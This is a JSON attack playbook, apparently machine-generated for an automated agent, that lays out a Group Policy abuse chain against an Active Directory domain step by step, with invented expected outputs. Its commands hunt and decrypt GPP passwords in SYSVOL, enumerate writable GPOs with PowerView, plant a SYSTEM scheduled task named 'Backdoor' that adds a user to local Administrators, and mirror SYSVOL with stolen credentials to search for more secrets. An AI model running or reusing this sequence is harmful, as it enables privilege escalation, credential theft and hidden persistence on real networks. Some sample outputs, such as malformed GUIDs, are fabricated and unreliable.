{
  "name": "group_policy_abuse",
  "description": "Group Policy abuse for privilege escalation and persistence in Active Directory",
  "pattern": "group.*policy|gpo.*abuse|gpp.*password|sysvol",
  "parameters": ["domain", "gpo_name"],
  "sequence": [
    {
      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "findstr", "args": ["/S", "/I", "cpassword", "\\\\corp.local\\SYSVOL\\corp.local\\Policies\\*.xml"]},
      "expected_output": {"type": "string", "example": "\\\\corp.local\\SYSVOL\\corp.local\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHINE\\Preferences\\Groups\\Groups.xml:        <Properties action=\"U\" newName=\"\" fullName=\"\" description=\"\" cpassword=\"edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ\" changeLogon=\"0\" noChange=\"1\" neverExpires=\"1\" acctDisabled=\"0\" userName=\"Administrator\"/>\n\n\\\\corp.local\\SYSVOL\\corp.local\\Policies\\{6AC1786C-016F-11D2-945F-00C04fB984F9}\\USER\\Preferences\\DataSources\\DataSources.xml:        <Properties name=\"Prod Database\" cpassword=\"AzVJmXh/J9KrU5n0czX1uBPLSUjzFE8j7dOltPD8tQ\" description=\"Production SQL Server\" connectionString=\"Data Source=db.corp.local;Initial Catalog=ProductionDB\" userName=\"sa\"/>\n\nGPP Passwords found!\n  File 1: Groups.xml\n    User: Administrator\n    Encrypted: edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ\n    \n  File 2: DataSources.xml  \n    User: sa (SQL Server)\n    Encrypted: AzVJmXh/J9KrU5n0czX1uBPLSUjzFE8j7dOltPD8tQ\n    \nGPP passwords use static AES key (publicly known)!\n  Can be decrypted instantly"}
    },
    {
      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "gpp-decrypt", "args": ["edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"]},
      "expected_output": {"type": "string", "example": "LocalAdminP@ss123!\n\nGPP password decrypted:\n  Encrypted: edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw...\n  Decrypted: LocalAdminP@ss123!\n  User: Administrator (local admin)\n  \nMicrosoft published AES key (MS14-025):\n  Key: 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b\n  \nDecrypt second password:\n  gpp-decrypt AzVJmXh/J9KrU5n0czX1uBPLSUjzFE8j7dOltPD8tQ\n  Result: SQLServerP@ss2023"}
    },
    {
      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "powershell", "args": ["-c", "Import-Module .\\PowerView.ps1; Get-NetGPO | Select-Object displayname,name,gpcfilesyspath"]},
      "expected_output": {"type": "string", "example": "displayname                         name                                  gpcfilesyspath\n-----------                         ----                                  --------------\nDefault Domain Policy               {31B2F340-016D-11D2-945F-00C04FB984F9} \\\\corp.local\\sysvol\\corp.local\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\nDefault Domain Controllers Policy   {6AC1786C-016F-11D2-945F-00C04fB984F9} \\\\corp.local\\sysvol\\corp.local\\Policies\\{6AC1786C-016F-11D2-945F-00C04fB984F9}\nWorkstation Security Policy         {A1B2C3D4-E5F6-7890-ABCD-EF1234567890} \\\\corp.local\\sysvol\\corp.local\\Policies\\{A1B2C3D4-E5F6-7890-ABCD-EF1234567890}\nServer Hardening Policy             {B2C3D4E5-F6G7-8901-BCDE-F12345678901} \\\\corp.local\\sysvol\\corp.local\\Policies\\{B2C3D4E5-F6G7-8901-BCDE-F12345678901}\nDeploy Software GPO                 {C3D4E5F6-G7H8-9012-CDEF-123456789012} \\\\corp.local\\sysvol\\corp.local\\Policies\\{C3D4E5F6-G7H8-9012-CDEF-123456789012}\n\nGroup Policy enumeration:\n  Total GPOs: 5\n  Paths: SYSVOL share\n  \nCheck each for:\n  - cpassword in XML files\n  - Scheduled tasks\n  - Startup/logon scripts\n  - Registry modifications"}
    },
    {
      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "powershell", "args": ["-c", "Import-Module .\\PowerView.ps1; Get-NetGPO | %{Get-NetGPOGroup -GPOname $_.name} | Select-Object GPOName,Filters,MemberOf,Members"]},
      "expected_output": {"type": "string", "example": "GPOName                             Filters MemberOf                          Members\n-------                             ------- --------                          -------\n{A1B2C3D4-E5F6-7890-ABCD-EF12345...         BUILTIN\\Administrators            CORP\\Domain Admins, CORP\\IT Admins, CORP\\john.doe\n{B2C3D4E5-F6G7-8901-BCDE-F123456...         BUILTIN\\Remote Desktop Users      CORP\\Remote Access, CORP\\Helpdesk\n\nGPO Local Group Membership:\n  GPO 1: Adds Domain Admins, IT Admins, john.doe to local Administrators\n  GPO 2: Adds Remote Access, Helpdesk to Remote Desktop Users\n  \nAbuse potential:\n  If you can modify GPO or become member of privileged group:\n    - Automatic admin rights on affected systems\n    - Apply GPO to specific OUs for targeted access"}
    },
    {
      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "powershell", "args": ["-c", "Import-Module .\\PowerView.ps1; Get-DomainObjectAcl -SearchBase 'CN=Policies,CN=System,DC=corp,DC=local' -ResolveGUIDs | ?{$_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite|WriteDacl'} | Select-Object ObjectDN,ActiveDirectoryRights,SecurityIdentifier | fl"]},
      "expected_output": {"type": "string", "example": "ObjectDN              : CN={C3D4E5F6-G7H8-9012-CDEF-123456789012},CN=Policies,CN=System,DC=corp,DC=local\nActiveDirectoryRights : GenericAll\nSecurityIdentifier    : S-1-5-21-123456789-123456789-123456789-1104\n\nObjectDN              : CN={A1B2C3D4-E5F6-7890-ABCD-EF1234567890},CN=Policies,CN=System,DC=corp,DC=local\nActiveDirectoryRights : WriteProperty, WriteDacl\nSecurityIdentifier    : S-1-5-21-123456789-123456789-123456789-1107\n\nGPO Permissions discovered:\n  User with SID ...1104 (john.doe): GenericAll on GPO\n  User with SID ...1107 (svc-web): WriteProperty on GPO\n  \nAbuse:\n  john.doe can fully control GPO C3D4E5F6...\n  Can add startup scripts, scheduled tasks, registry keys\n  \nCheck GPO links:\n  Get-NetGPO -GPOName '{C3D4E5F6-G7H8-9012-CDEF-123456789012}' | Select-Object gpcfilesyspath,gPLink"}
    },
    {
      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "powershell", "args": ["-c", "New-GPOImmediateTask -TaskName Backdoor -Command 'cmd.exe' -CommandArguments '/c net localgroup administrators lowpriv /add' -GPODisplayName 'Workstation Security Policy' -Force"]},
      "expected_output": {"type": "string", "example": "[*] Using gpcfilesyspath: \\\\corp.local\\SYSVOL\\corp.local\\Policies\\{A1B2C3D4-E5F6-7890-ABCD-EF1234567890}\n[*] Creating scheduled task XML in: \\\\corp.local\\SYSVOL\\corp.local\\Policies\\{A1B2C3D4-E5F6-7890-ABCD-EF1234567890}\\MACHINE\\Preferences\\ScheduledTasks\\ScheduledTasks.xml\n[+] Malicious task created: Backdoor\n[+] Command: cmd.exe /c net localgroup administrators lowpriv /add\n[+] Trigger: Immediate (runs on next group policy update)\n[+] RunAs: SYSTEM\n\nGPO backdoor created!\n  GPO: Workstation Security Policy\n  Task: Backdoor\n  Command: Add lowpriv to local Administrators\n  Execution: SYSTEM privileges\n  Applies to: All workstations linked to GPO\n  \nTrigger GPO update:\n  Wait for automatic refresh (90-120 min)\n  Or force: gpupdate /force on target machine\n  \nPersistence:\n  Runs on every GP update\n  Survives reboots\n  Difficult to detect without GPO auditing"}
    },
    {
      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "smbclient '\\\\\\\\corp.local\\\\SYSVOL' -U 'corp.local\\john.doe%P@ssw0rd123' -c 'prompt OFF; recurse ON; mget corp.local\\Policies\\*'"]},
      "expected_output": {"type": "string", "example": "getting file \\corp.local\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\GPT.INI\nget ting file \\corp.local\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHINE\\Registry.pol\ngetting file \\corp.local\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHINE\\Preferences\\Groups\\Groups.xml\ngetting file \\corp.local\\Policies\\{6AC1786C-016F-11D2-945F-00C04fB984F9}\\GPT.INI\n[... downloading all GPO files ...]\n\nSYSVOL contents downloaded:\n  Total files: 150+\n  GPO configurations\n  Scripts (startup/logon/shutdown)\n  Preference files (groups, registry, scheduled tasks)\n  \nOffline analysis:\n  grep -r 'cpassword' corp.local/\n  find . -name '*.bat' -o -name '*.ps1' -o -name '*.vbs'\n  grep -r 'password\\|credential\\|secret' .\n  \nCommon finds:\n  - Hardcoded credentials in scripts\n  - GPP passwords\n  - Service account passwords\n  - Database connection strings"}
    }
  ],
  "stats": {"uses": 0, "successes": 0, "failures": 0, "success_rate": 0.0},
  "created_by": "neural_mesh_v5.2_generator"
}
